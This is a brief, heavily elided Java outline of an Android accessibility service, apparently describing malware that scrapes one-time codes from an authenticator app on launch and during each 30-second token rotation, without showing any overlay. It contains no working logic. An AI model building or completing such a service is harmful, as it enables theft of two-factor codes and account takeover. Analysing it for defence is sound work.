...
public class PhantomFingerService extends AccessibilityService {
    ...
    public void onAccessibilityEvent(AccessibilityEvent event) {
        ...
        if (packageName.equals(TARGET_PACKAGE)) {
            ...
            // Scenario A: User opens the authenticator app
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                ...
                // Scrape the codes instantly on launch without displaying any overlay layout
            ...
            // Scenario B: Live 30-second token rotation
